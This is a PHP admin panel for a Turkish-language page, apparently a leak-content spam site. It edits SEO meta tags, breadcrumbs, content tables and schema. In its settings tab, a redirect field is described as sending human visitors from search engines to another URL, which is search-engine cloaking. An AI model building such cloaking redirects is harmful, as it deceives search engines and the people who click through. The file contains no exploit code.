<?php
session_start();
if (empty($_SESSION['admin_logged_in'])) {
    header('Location: index.php');
    exit;
}

require_once __DIR__ . '/../db.php';
init_db();

$db          = get_db();
$m           = get_meta();
$breadcrumbs = $db->query("SELECT * FROM breadcrumbs ORDER BY sort_order")->fetchAll(PDO::FETCH_ASSOC);
$sections    = $db->query("SELECT * FROM sections ORDER BY sort_order")->fetchAll(PDO::FETCH_ASSOC);
$t1_rows     = $db->query("SELECT * FROM table1_rows ORDER BY sort_order")->fetchAll(PDO::FETCH_ASSOC);
$t2_rows     = $db->query("SELECT * FROM table2_rows ORDER BY sort_order")->fetchAll(PDO::FETCH_ASSOC);
$tips        = $db->query("SELECT * FROM tips ORDER BY sort_order")->fetchAll(PDO::FETCH_ASSOC);
$schema_bcs  = $db->query("SELECT * FROM schema_breadcrumbs ORDER BY position")->fetchAll(PDO::FETCH_ASSOC);
?><!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin Paneli - Dashboard</title>
<style>
:root{--primary:#2d1b4e;--accent:#40e0d0;--bg:#f0f2f5;--white:#fff;--border:#e0e0e0;--text:#333;--muted:#777;--danger:#e53935}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}

/* NAV */
nav{background:var(--primary);color:#fff;padding:0 24px;display:flex;align-items:center;justify-content:space-between;height:60px;position:sticky;top:0;z-index:100;box-shadow:0 2px 8px rgba(0,0,0,.3)}
nav h1{font-size:18px;color:var(--accent)}
nav a{color:var(--accent);text-decoration:none;font-size:14px;padding:8px 16px;border:1px solid var(--accent);border-radius:6px;transition:.2s}
nav a:hover{background:rgba(64,224,208,.1)}

/* LAYOUT */
.container{max-width:1200px;margin:0 auto;padding:24px}

/* TABS */
.tabs{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:24px}
.tab-btn{padding:10px 18px;border:2px solid var(--border);background:var(--white);border-radius:8px;cursor:pointer;font-size:14px;color:var(--muted);transition:.2s;font-family:'Segoe UI',sans-serif}
.tab-btn:hover{border-color:var(--accent);color:var(--primary)}
.tab-btn.active{background:var(--primary);border-color:var(--primary);color:var(--accent)}

/* PANELS */
.tab-panel{display:none}
.tab-panel.active{display:block}

/* CARD */
.card{background:var(--white);border-radius:12px;padding:28px;margin-bottom:20px;box-shadow:0 2px 8px rgba(0,0,0,.07)}
.card h2{font-size:18px;color:var(--primary);margin-bottom:20px;padding-bottom:12px;border-bottom:2px solid var(--accent)}
.card h3{font-size:15px;color:var(--primary);margin:16px 0 10px;font-weight:600}

/* FORM */
.field{margin-bottom:18px}
label{display:block;font-size:13px;font-weight:600;color:var(--muted);margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
input[type=text],textarea,select{width:100%;padding:10px 14px;border:2px solid var(--border);border-radius:8px;font-size:14px;font-family:inherit;outline:none;transition:.2s;color:var(--text)}
input[type=text]:focus,textarea:focus{border-color:var(--accent)}
textarea{resize:vertical;min-height:80px;line-height:1.6}
.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.grid-3{display:grid;grid-template-columns:1fr 2fr 1fr;gap:10px;align-items:start}

/* BUTTONS */
.btn{padding:10px 22px;border:none;border-radius:8px;cursor:pointer;font-size:14px;font-family:inherit;transition:.2s;font-weight:600}
.btn-primary{background:var(--primary);color:var(--accent)}
.btn-primary:hover{opacity:.9;transform:translateY(-1px)}
.btn-accent{background:var(--accent);color:var(--primary)}
.btn-accent:hover{opacity:.9}
.btn-danger{background:var(--danger);color:#fff;padding:6px 12px;font-size:13px}
.btn-sm{padding:6px 14px;font-size:13px}
.btn-add{background:rgba(64,224,208,.15);border:2px dashed var(--accent);color:var(--primary);width:100%;padding:10px;border-radius:8px;cursor:pointer;font-size:14px;font-family:inherit;transition:.2s;margin-top:8px}
.btn-add:hover{background:rgba(64,224,208,.3)}
.save-row{display:flex;align-items:center;gap:12px;margin-top:20px;padding-top:16px;border-top:1px solid var(--border)}

/* REPEATER ROWS */
.repeater-row{background:#fafafa;border:1px solid var(--border);border-radius:10px;padding:16px;margin-bottom:10px;position:relative}
.repeater-row .del-btn{position:absolute;top:10px;right:10px}
.bc-row{display:grid;grid-template-columns:1fr 2fr auto;gap:10px;align-items:center;background:#fafafa;border:1px solid var(--border);border-radius:10px;padding:12px;margin-bottom:8px}
.bc-row .drag{cursor:grab;color:var(--muted);font-size:18px;padding:0 8px}

/* ALERT */
.alert{display:none;padding:12px 18px;border-radius:8px;font-size:14px;margin-top:12px}
.alert.success{background:#e8f5e9;border:1px solid #a5d6a7;color:#2e7d32;display:flex}
.alert.error{background:#ffebee;border:1px solid #ef9a9a;color:#c62828;display:flex}

/* PREVIEW LINK */
.preview-bar{background:var(--primary);color:var(--accent);padding:10px 24px;text-align:center;font-size:13px}
.preview-bar a{color:#fff;margin-left:8px}
</style>
</head>
<body>
<nav>
  <h1>⚡ Admin Paneli</h1>
  <a href="save.php?action=logout">Çıkış Yap</a>
</nav>

<div class="preview-bar">
  Web sitesini görüntüle: <a href="../index.php" target="_blank">→ Siteyi Aç</a>
</div>

<div class="container">

<!-- TABS -->
<div class="tabs">
  <button class="tab-btn active" data-tab="meta">SEO & Meta</button>
  <button class="tab-btn" data-tab="breadcrumbs">Breadcrumb Linkler</button>
  <button class="tab-btn" data-tab="sections">İçerik Bölümleri</button>
  <button class="tab-btn" data-tab="table1">Tablo 1 (Hizmetler)</button>
  <button class="tab-btn" data-tab="table2">Tablo 2 (Paketler)</button>
  <button class="tab-btn" data-tab="tips">Tavsiyeler (Liste)</button>
  <button class="tab-btn" data-tab="schema">Schema & JSON-LD</button>
  <button class="tab-btn" data-tab="settings">Diğer Ayarlar</button>
</div>

<!-- ════════════════════ TAB: META ════════════════════ -->
<div id="tab-meta" class="tab-panel active">
<form class="card" onsubmit="save(event,'save_meta',this)">
  <h2>SEO & Meta Etiketler</h2>
  <div class="field"><label>Sayfa Başlığı (title)</label>
    <input type="text" name="site_title" value="<?= htmlspecialchars($m['site_title'] ?? '') ?>"></div>
  <div class="field"><label>Meta Description</label>
    <textarea name="meta_description"><?= htmlspecialchars($m['meta_description'] ?? '') ?></textarea></div>
  <div class="field"><label>Meta Keywords</label>
    <textarea name="meta_keywords"><?= htmlspecialchars($m['meta_keywords'] ?? '') ?></textarea></div>
  <div class="grid-2">
    <div class="field"><label>Yazar (author)</label>
      <input type="text" name="meta_author" value="<?= htmlspecialchars($m['meta_author'] ?? '') ?>"></div>
    <div class="field"><label>Robots</label>
      <input type="text" name="meta_robots" value="<?= htmlspecialchars($m['meta_robots'] ?? '') ?>"></div>
  </div>
  <div class="grid-2">
    <div class="field"><label>Dil (language)</label>
      <input type="text" name="meta_language" value="<?= htmlspecialchars($m['meta_language'] ?? '') ?>"></div>
    <div class="field"><label>Revisit After</label>
      <input type="text" name="meta_revisit" value="<?= htmlspecialchars($m['meta_revisit'] ?? '') ?>"></div>
  </div>
  <h3>Open Graph</h3>
  <div class="field"><label>OG Title</label>
    <input type="text" name="og_title" value="<?= htmlspecialchars($m['og_title'] ?? '') ?>"></div>
  <div class="field"><label>OG Description</label>
    <textarea name="og_description"><?= htmlspecialchars($m['og_description'] ?? '') ?></textarea></div>
  <div class="grid-2">
    <div class="field"><label>OG Type</label>
      <input type="text" name="og_type" value="<?= htmlspecialchars($m['og_type'] ?? '') ?>"></div>
    <div class="field"><label>OG URL</label>
      <input type="text" name="og_url" value="<?= htmlspecialchars($m['og_url'] ?? '') ?>"></div>
  </div>
  <h3>URL Ayarları</h3>
  <div class="field"><label>Canonical URL</label>
    <input type="text" name="canonical_url" value="<?= htmlspecialchars($m['canonical_url'] ?? '') ?>"></div>
  <div class="grid-2">
    <div class="field"><label>hreflang TR</label>
      <input type="text" name="hreflang_tr" value="<?= htmlspecialchars($m['hreflang_tr'] ?? '') ?>"></div>
    <div class="field"><label>hreflang x-default</label>
      <input type="text" name="hreflang_default" value="<?= htmlspecialchars($m['hreflang_default'] ?? '') ?>"></div>
  </div>
  <div class="save-row">
    <button class="btn btn-primary" type="submit">Kaydet</button>
    <div class="alert"></div>
  </div>
</form>
</div>

<!-- ════════════════════ TAB: BREADCRUMBS ════════════════════ -->
<div id="tab-breadcrumbs" class="tab-panel">
<div class="card">
  <h2>Breadcrumb Linkleri</h2>
  <form id="bc-form" onsubmit="save(event,'save_breadcrumbs',this)">
    <div id="bc-list">
<?php foreach ($breadcrumbs as $bc): ?>
      <div class="bc-row">
        <input type="text" name="text[]" value="<?= htmlspecialchars($bc['text']) ?>" placeholder="Link metni">
        <input type="text" name="href[]" value="<?= htmlspecialchars($bc['href']) ?>" placeholder="https://...">
        <button type="button" class="btn btn-danger" onclick="this.closest('.bc-row').remove()">✕</button>
      </div>
<?php endforeach; ?>
    </div>
    <button type="button" class="btn-add" onclick="addBcRow()">+ Yeni Link Ekle</button>
    <div class="save-row">
      <button class="btn btn-primary" type="submit">Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
</div>
</div>

<!-- ════════════════════ TAB: SECTIONS ════════════════════ -->
<div id="tab-sections" class="tab-panel">
<div class="card">
  <h2>İçerik Bölümleri (H2 + Paragraf)</h2>
  <p style="color:var(--muted);font-size:13px;margin-bottom:16px">Paragraf alanında HTML kullanabilirsiniz. &lt;strong&gt;, &lt;a&gt; gibi etiketler desteklenir.</p>
  <form id="sections-form" onsubmit="save(event,'save_sections',this)">
    <div id="sections-list">
<?php foreach ($sections as $sec): ?>
      <div class="repeater-row">
        <input type="hidden" name="id[]" value="<?= (int)$sec['id'] ?>">
        <div class="field"><label>H2 Başlık</label>
          <input type="text" name="heading[]" value="<?= htmlspecialchars($sec['heading']) ?>"></div>
        <div class="field"><label>Paragraf İçeriği (HTML)</label>
          <textarea name="body[]" style="min-height:120px"><?= htmlspecialchars($sec['body']) ?></textarea></div>
        <button type="button" class="btn btn-danger del-btn" onclick="this.closest('.repeater-row').remove()">✕ Sil</button>
      </div>
<?php endforeach; ?>
    </div>
    <button type="button" class="btn-add" onclick="addSection()">+ Yeni Bölüm Ekle</button>
    <div class="save-row">
      <button class="btn btn-primary" type="submit">Tümünü Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
</div>
</div>

<!-- ════════════════════ TAB: TABLE 1 ════════════════════ -->
<div id="tab-table1" class="tab-panel">
<div class="card">
  <h2>Tablo 1 - Hizmetler</h2>
  <form class="card" style="margin-bottom:0;padding:0;box-shadow:none" onsubmit="save(event,'save_meta',this)">
    <div class="field"><label>Tablo H2 Başlığı</label>
      <input type="text" name="table1_h2" value="<?= htmlspecialchars($m['table1_h2'] ?? '') ?>"></div>
    <div class="field"><label>Tablo Giriş Paragrafı (HTML)</label>
      <textarea name="table1_intro"><?= htmlspecialchars($m['table1_intro'] ?? '') ?></textarea></div>
    <div class="grid-3">
      <div class="field"><label>Sütun 1 Başlığı</label>
        <input type="text" name="table1_th1" value="<?= htmlspecialchars($m['table1_th1'] ?? '') ?>"></div>
      <div class="field"><label>Sütun 2 Başlığı</label>
        <input type="text" name="table1_th2" value="<?= htmlspecialchars($m['table1_th2'] ?? '') ?>"></div>
      <div class="field"><label>Sütun 3 Başlığı</label>
        <input type="text" name="table1_th3" value="<?= htmlspecialchars($m['table1_th3'] ?? '') ?>"></div>
    </div>
    <div class="save-row">
      <button class="btn btn-accent btn-sm" type="submit">Başlıkları Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
</div>

<div class="card">
  <h2>Tablo 1 Satırları</h2>
  <form id="t1-form" onsubmit="save(event,'save_table1',this)">
    <div id="t1-list">
<?php foreach ($t1_rows as $r): ?>
      <div class="repeater-row">
        <input type="hidden" name="id[]" value="<?= (int)$r['id'] ?>">
        <div class="grid-3">
          <div class="field"><label>İfşa Türü</label>
            <input type="text" name="col_type[]" value="<?= htmlspecialchars($r['col_type']) ?>"></div>
          <div class="field"><label>Özellikler (HTML)</label>
            <textarea name="col_feat[]"><?= htmlspecialchars($r['col_features']) ?></textarea></div>
          <div class="field"><label>Erişim</label>
            <input type="text" name="col_acc[]" value="<?= htmlspecialchars($r['col_access']) ?>"></div>
        </div>
        <button type="button" class="btn btn-danger del-btn" onclick="this.closest('.repeater-row').remove()">✕</button>
      </div>
<?php endforeach; ?>
    </div>
    <button type="button" class="btn-add" onclick="addT1Row()">+ Yeni Satır Ekle</button>
    <div class="save-row">
      <button class="btn btn-primary" type="submit">Satırları Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
</div>

<div class="card">
  <form class="card" style="margin-bottom:0;padding:0;box-shadow:none" onsubmit="save(event,'save_meta',this)">
    <div class="field"><label>Tablo Altı Paragraf (HTML - footer_para)</label>
      <textarea name="footer_para" style="min-height:100px"><?= htmlspecialchars($m['footer_para'] ?? '') ?></textarea></div>
    <div class="save-row">
      <button class="btn btn-accent btn-sm" type="submit">Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
</div>
</div>

<!-- ════════════════════ TAB: TABLE 2 ════════════════════ -->
<div id="tab-table2" class="tab-panel">
<div class="card">
  <h2>Tablo 2 - Paketler</h2>
  <form class="card" style="margin-bottom:16px;padding:0;box-shadow:none" onsubmit="save(event,'save_meta',this)">
    <div class="field"><label>Tablo H2 Başlığı</label>
      <input type="text" name="table2_h2" value="<?= htmlspecialchars($m['table2_h2'] ?? '') ?>"></div>
    <div class="field"><label>Tablo Giriş Paragrafı (HTML)</label>
      <textarea name="table2_intro"><?= htmlspecialchars($m['table2_intro'] ?? '') ?></textarea></div>
    <div class="grid-3">
      <div class="field"><label>Sütun 1 Başlığı</label>
        <input type="text" name="table2_th1" value="<?= htmlspecialchars($m['table2_th1'] ?? '') ?>"></div>
      <div class="field"><label>Sütun 2 Başlığı</label>
        <input type="text" name="table2_th2" value="<?= htmlspecialchars($m['table2_th2'] ?? '') ?>"></div>
      <div class="field"><label>Sütun 3 Başlığı</label>
        <input type="text" name="table2_th3" value="<?= htmlspecialchars($m['table2_th3'] ?? '') ?>"></div>
    </div>
    <div class="save-row">
      <button class="btn btn-accent btn-sm" type="submit">Başlıkları Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
  <form id="t2-form" onsubmit="save(event,'save_table2',this)">
    <div id="t2-list">
<?php foreach ($t2_rows as $r): ?>
      <div class="repeater-row">
        <input type="hidden" name="id[]" value="<?= (int)$r['id'] ?>">
        <div class="grid-3">
          <div class="field"><label>Paket Adı</label>
            <input type="text" name="col_type[]" value="<?= htmlspecialchars($r['col_type']) ?>"></div>
          <div class="field"><label>Özellikler (HTML)</label>
            <textarea name="col_feat[]"><?= htmlspecialchars($r['col_features']) ?></textarea></div>
          <div class="field"><label>Süre</label>
            <input type="text" name="col_dur[]" value="<?= htmlspecialchars($r['col_duration']) ?>"></div>
        </div>
        <button type="button" class="btn btn-danger del-btn" onclick="this.closest('.repeater-row').remove()">✕</button>
      </div>
<?php endforeach; ?>
    </div>
    <button type="button" class="btn-add" onclick="addT2Row()">+ Yeni Satır Ekle</button>
    <div class="save-row">
      <button class="btn btn-primary" type="submit">Satırları Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
</div>
</div>

<!-- ════════════════════ TAB: TIPS ════════════════════ -->
<div id="tab-tips" class="tab-panel">
<div class="card">
  <h2>Tavsiyeler (Liste Bölümü)</h2>
  <form class="card" style="margin-bottom:16px;padding:0;box-shadow:none" onsubmit="save(event,'save_meta',this)">
    <div class="field"><label>Bölüm H2 Başlığı</label>
      <input type="text" name="tips_h2" value="<?= htmlspecialchars($m['tips_h2'] ?? '') ?>"></div>
    <div class="save-row">
      <button class="btn btn-accent btn-sm" type="submit">Başlığı Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
  <form id="tips-form" onsubmit="save(event,'save_tips',this)">
    <div id="tips-list">
<?php foreach ($tips as $tip): ?>
      <div class="repeater-row">
        <input type="hidden" name="id[]" value="<?= (int)$tip['id'] ?>">
        <div class="grid-2">
          <div class="field"><label>Kalın Başlık (&lt;strong&gt;)</label>
            <input type="text" name="strong_text[]" value="<?= htmlspecialchars($tip['strong_text']) ?>"></div>
          <div class="field"><label>Açıklama (HTML)</label>
            <textarea name="body[]"><?= htmlspecialchars($tip['body']) ?></textarea></div>
        </div>
        <button type="button" class="btn btn-danger del-btn" onclick="this.closest('.repeater-row').remove()">✕</button>
      </div>
<?php endforeach; ?>
    </div>
    <button type="button" class="btn-add" onclick="addTip()">+ Yeni Madde Ekle</button>
    <div class="save-row">
      <button class="btn btn-primary" type="submit">Listeyi Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
</div>

<div class="card">
  <form onsubmit="save(event,'save_meta',this)">
    <div class="field"><label>Merkez Anahtar Kelime Metni (center h1)</label>
      <textarea name="center_text" style="min-height:100px"><?= htmlspecialchars($m['center_text'] ?? '') ?></textarea></div>
    <div class="save-row">
      <button class="btn btn-primary" type="submit">Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
</div>
</div>

<!-- ════════════════════ TAB: SCHEMA ════════════════════ -->
<div id="tab-schema" class="tab-panel">
<div class="card">
  <h2>Organization Schema (JSON-LD)</h2>
  <form onsubmit="save(event,'save_meta',this)">
    <div class="grid-2">
      <div class="field"><label>Organizasyon Adı</label>
        <input type="text" name="schema_org_name" value="<?= htmlspecialchars($m['schema_org_name'] ?? '') ?>"></div>
      <div class="field"><label>URL</label>
        <input type="text" name="schema_org_url" value="<?= htmlspecialchars($m['schema_org_url'] ?? '') ?>"></div>
    </div>
    <div class="field"><label>Alternate Name</label>
      <input type="text" name="schema_org_altname" value="<?= htmlspecialchars($m['schema_org_altname'] ?? '') ?>"></div>
    <div class="field"><label>Logo URL</label>
      <input type="text" name="schema_org_logo" value="<?= htmlspecialchars($m['schema_org_logo'] ?? '') ?>"></div>
    <div class="save-row">
      <button class="btn btn-primary" type="submit">Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
</div>

<div class="card">
  <h2>BreadcrumbList Schema (JSON-LD)</h2>
  <form id="sbc-form" onsubmit="save(event,'save_schema_bc',this)">
    <div id="sbc-list">
<?php foreach ($schema_bcs as $sbc): ?>
      <div class="repeater-row">
        <div class="grid-3">
          <div class="field"><label>Position</label>
            <input type="text" name="position[]" value="<?= (int)$sbc['position'] ?>"></div>
          <div class="field"><label>Item ID (@id)</label>
            <input type="text" name="item_id[]" value="<?= htmlspecialchars($sbc['item_id']) ?>"></div>
          <div class="field"><label>Name</label>
            <input type="text" name="name[]" value="<?= htmlspecialchars($sbc['name']) ?>"></div>
        </div>
        <button type="button" class="btn btn-danger del-btn" onclick="this.closest('.repeater-row').remove()">✕</button>
      </div>
<?php endforeach; ?>
    </div>
    <button type="button" class="btn-add" onclick="addSbc()">+ Yeni Breadcrumb Ekle</button>
    <div class="save-row">
      <button class="btn btn-primary" type="submit">Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
</div>
</div>

<!-- ════════════════════ TAB: SETTINGS ════════════════════ -->
<div id="tab-settings" class="tab-panel">
<div class="card">
  <h2>Yönlendirme ve Takip Ayarları</h2>
  <form onsubmit="save(event,'save_meta',this)">
    <div class="field"><label>Ziyaretçi Yönlendirme URL (JS redirect)</label>
      <input type="text" name="redirect_url" value="<?= htmlspecialchars($m['redirect_url'] ?? '') ?>">
      <small style="color:var(--muted);font-size:12px">Arama motorundan gelen insan kullanıcıları bu URL'ye yönlendirir. Boş bırakırsanız JS eklenmez.</small></div>
    <div class="field"><label>Google Site Verification</label>
      <input type="text" name="google_site_verify" value="<?= htmlspecialchars($m['google_site_verify'] ?? '') ?>"></div>
    <div class="save-row">
      <button class="btn btn-primary" type="submit">Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
</div>

<div class="card">
  <h2>Favicon & İkonlar</h2>
  <form onsubmit="save(event,'save_meta',this)">
    <div class="field"><label>Favicon 32x32 URL</label>
      <input type="text" name="favicon_32" value="<?= htmlspecialchars($m['favicon_32'] ?? '') ?>"></div>
    <div class="field"><label>Favicon 192x192 URL</label>
      <input type="text" name="favicon_192" value="<?= htmlspecialchars($m['favicon_192'] ?? '') ?>"></div>
    <div class="field"><label>Apple Touch Icon URL</label>
      <input type="text" name="apple_touch_icon" value="<?= htmlspecialchars($m['apple_touch_icon'] ?? '') ?>"></div>
    <div class="grid-2">
      <div class="field"><label>Theme Color</label>
        <input type="text" name="theme_color" value="<?= htmlspecialchars($m['theme_color'] ?? '') ?>"></div>
      <div class="field"><label>Profile URL (gmpg)</label>
        <input type="text" name="profile_url" value="<?= htmlspecialchars($m['profile_url'] ?? '') ?>"></div>
    </div>
    <div class="save-row">
      <button class="btn btn-primary" type="submit">Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
</div>

<div class="card">
  <h2>Cloudflare Beacon</h2>
  <form onsubmit="save(event,'save_meta',this)">
    <div class="field"><label>Beacon Script URL</label>
      <input type="text" name="cf_beacon_src" value="<?= htmlspecialchars($m['cf_beacon_src'] ?? '') ?>"></div>
    <div class="field"><label>Integrity Hash</label>
      <input type="text" name="cf_beacon_integrity" value="<?= htmlspecialchars($m['cf_beacon_integrity'] ?? '') ?>"></div>
    <div class="field"><label>Token</label>
      <input type="text" name="cf_beacon_token" value="<?= htmlspecialchars($m['cf_beacon_token'] ?? '') ?>"></div>
    <div class="save-row">
      <button class="btn btn-primary" type="submit">Kaydet</button>
      <div class="alert"></div>
    </div>
  </form>
</div>
</div>

</div><!-- /container -->

<script>
// ── TAB SWITCHING ──────────────────────────────────────────────
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.tab-btn,.tab-panel').forEach(el => el.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
  });
});

// ── SAVE via AJAX ──────────────────────────────────────────────
function save(e, action, form) {
  e.preventDefault();
  const fd  = new FormData(form);
  fd.append('action', action);
  const btn   = form.querySelector('button[type=submit]');
  const alert = form.querySelector('.alert');
  btn.disabled = true;
  btn.textContent = 'Kaydediliyor...';
  fetch('save.php', {method:'POST', body:fd})
    .then(r => r.json())
    .then(d => {
      alert.className = 'alert ' + (d.ok ? 'success' : 'error');
      alert.textContent = d.ok ? '✓ Başarıyla kaydedildi!' : ('Hata: ' + d.error);
      setTimeout(() => { alert.style.display = 'none'; alert.className = 'alert'; }, 3000);
    })
    .catch(() => {
      alert.className = 'alert error';
      alert.textContent = 'Bağlantı hatası.';
    })
    .finally(() => {
      btn.disabled = false;
      btn.textContent = btn.dataset.label || 'Kaydet';
    });
}

// ── ADD ROW HELPERS ────────────────────────────────────────────
function addBcRow() {
  const row = `<div class="bc-row">
    <input type="text" name="text[]" placeholder="Link metni">
    <input type="text" name="href[]" placeholder="https://...">
    <button type="button" class="btn btn-danger" onclick="this.closest('.bc-row').remove()">✕</button>
  </div>`;
  document.getElementById('bc-list').insertAdjacentHTML('beforeend', row);
}

function addSection() {
  const row = `<div class="repeater-row">
    <input type="hidden" name="id[]" value="0">
    <div class="field"><label>H2 Başlık</label>
      <input type="text" name="heading[]" placeholder="Bölüm başlığı"></div>
    <div class="field"><label>Paragraf İçeriği (HTML)</label>
      <textarea name="body[]" style="min-height:120px" placeholder="<p>İçerik buraya...</p>"></textarea></div>
    <button type="button" class="btn btn-danger del-btn" onclick="this.closest('.repeater-row').remove()">✕ Sil</button>
  </div>`;
  document.getElementById('sections-list').insertAdjacentHTML('beforeend', row);
}

function addT1Row() {
  const row = `<div class="repeater-row">
    <input type="hidden" name="id[]" value="0">
    <div class="grid-3">
      <div class="field"><label>İfşa Türü</label>
        <input type="text" name="col_type[]"></div>
      <div class="field"><label>Özellikler (HTML)</label>
        <textarea name="col_feat[]"></textarea></div>
      <div class="field"><label>Erişim</label>
        <input type="text" name="col_acc[]" value="7/24 Aktif"></div>
    </div>
    <button type="button" class="btn btn-danger del-btn" onclick="this.closest('.repeater-row').remove()">✕</button>
  </div>`;
  document.getElementById('t1-list').insertAdjacentHTML('beforeend', row);
}

function addT2Row() {
  const row = `<div class="repeater-row">
    <input type="hidden" name="id[]" value="0">
    <div class="grid-3">
      <div class="field"><label>Paket Adı</label>
        <input type="text" name="col_type[]"></div>
      <div class="field"><label>Özellikler (HTML)</label>
        <textarea name="col_feat[]"></textarea></div>
      <div class="field"><label>Süre</label>
        <input type="text" name="col_dur[]"></div>
    </div>
    <button type="button" class="btn btn-danger del-btn" onclick="this.closest('.repeater-row').remove()">✕</button>
  </div>`;
  document.getElementById('t2-list').insertAdjacentHTML('beforeend', row);
}

function addTip() {
  const row = `<div class="repeater-row">
    <input type="hidden" name="id[]" value="0">
    <div class="grid-2">
      <div class="field"><label>Kalın Başlık</label>
        <input type="text" name="strong_text[]"></div>
      <div class="field"><label>Açıklama (HTML)</label>
        <textarea name="body[]"></textarea></div>
    </div>
    <button type="button" class="btn btn-danger del-btn" onclick="this.closest('.repeater-row').remove()">✕</button>
  </div>`;
  document.getElementById('tips-list').insertAdjacentHTML('beforeend', row);
}

function addSbc() {
  const pos = document.querySelectorAll('#sbc-list .repeater-row').length + 1;
  const row = `<div class="repeater-row">
    <div class="grid-3">
      <div class="field"><label>Position</label>
        <input type="text" name="position[]" value="${pos}"></div>
      <div class="field"><label>Item ID</label>
        <input type="text" name="item_id[]" placeholder="/#section"></div>
      <div class="field"><label>Name</label>
        <input type="text" name="name[]"></div>
    </div>
    <button type="button" class="btn btn-danger del-btn" onclick="this.closest('.repeater-row').remove()">✕</button>
  </div>`;
  document.getElementById('sbc-list').insertAdjacentHTML('beforeend', row);
}

// Save buttons label cache
document.querySelectorAll('button[type=submit]').forEach(b => b.dataset.label = b.textContent);
</script>
</body>
</html>
